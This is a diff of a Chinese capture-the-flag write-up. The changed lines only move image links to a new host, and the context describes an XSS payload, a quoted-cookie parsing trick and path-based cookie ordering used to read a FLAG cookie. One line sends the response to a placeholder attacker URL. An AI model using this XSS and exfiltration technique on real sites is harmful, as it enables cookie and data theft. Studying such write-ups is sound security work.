@@ -233,7 +233,7 @@ document.addEventListener("DOMContentLoaded", async () => {
 
 上面的Payload渲染之后会变成这个样子，可以发现确实是被当成了`<p>`标签，后面不完整的部分就直接被Chrome补全了。直接实现了XSS。
 
-![](https://pic.hujiekang.top/uploads/big/0f68ea6f212fd2d74c388c84597766f3.png)
+![](https://images.hujiekang.top/blogimage-0f68ea6f212fd2d74c388c84597766f3-f42f8ca8.png)
 
 # 构造页面让Bot访问
 
@@ -309,19 +309,19 @@ public class ExceptionController {
 
 但是还是发现了一些不寻常的东西，就是这套判断逻辑中还对Cookie的值有没有加引号进行了判断，如果发现这个值是被引号括住的，那么就会读取引号里面的内容。下面这段代码判断当前字符是否属于Cookie的值这一部分（`=`后面的就判断为Cookie的值），如果开头是引号，那么`inQuoted` Flag就会设为`true`。
 
-![](https://pic.hujiekang.top/uploads/big/2914e2da02adfd7b51f326323b4f7945.png)
+![](https://images.hujiekang.top/blogimage-2914e2da02adfd7b51f326323b4f7945-96fa4157.png)
 
 接下来看inQuoted为true的处理。可见除非再次碰到了引号（说明引号括起来的部分结束了）或者碰到了`\x00`（字符串结束了）这两种情况，否则就会将后面的字符一直读取为当前Cookie的值。这就给利用提供了机会。
 
-![](https://pic.hujiekang.top/uploads/medium/aeb22808f351b9440b4288d6bed97ae1.png)
+![](https://images.hujiekang.top/blogimage-aeb22808f351b9440b4288d6bed97ae1-1d91398a.png)
 
 所以只要下面这种情况，就可以直接读取到Flag：
 
-![](https://pic.hujiekang.top/uploads/big/b61c5072f5ef240881cf2a0ee04f409c.png)
+![](https://images.hujiekang.top/blogimage-b61c5072f5ef240881cf2a0ee04f409c-ce964dfc.png)
 
 但是Bot那边显然没法像Burp那样抓包修改Cookie的顺序，按照先来后到的原则，通过XSS添加的Cookie必然是在最后一位的（实际测试也是这样），它后边没有任何其他Cookie，所以和没改效果差不多。在此处苦思冥想整不明白咋回事，于是搜了一下Chrome是怎么处理Cookie的排序的，有个回答直接把Chromium的源码贴了出来：
 
-![](https://pic.hujiekang.top/uploads/big/710bb8486321e3521d1114eadd60d745.png)
+![](https://images.hujiekang.top/blogimage-710bb8486321e3521d1114eadd60d745-b876263a.png)
 
 这就说的很清楚了，除了先来后到以外，还有个优先级更高的因素，就是Cookie生效的路径的长度。于是乎迎刃而解，因为`FLAG`的生效路径是`/`，那只需要把`error` Cookie的生效路径整长一点，就可以让它排在FLAG前面了。最后整出了Payload，把XSS页面里面的题目服务器的IP地址换成了Docker里面的`http://web:8000`，因为FLAG这个Cookie只在这个域下面生效。
 
@@ -336,7 +336,7 @@ location.href='<EVIL_SERVER_URL>'+btoa(req.responseText);
 
 用服务器接收Bot的请求，就能够拿到Bot那边`/error/frontend`的响应，提取出Flag。
 
-![](https://pic.hujiekang.top/uploads/big/4fbc792683281e41eaf772f4f612d711.png)
+![](https://images.hujiekang.top/blogimage-4fbc792683281e41eaf772f4f612d711-49061f33.png)
 
 最后，闲得没事做整了个脚本一键拿Flag：
 
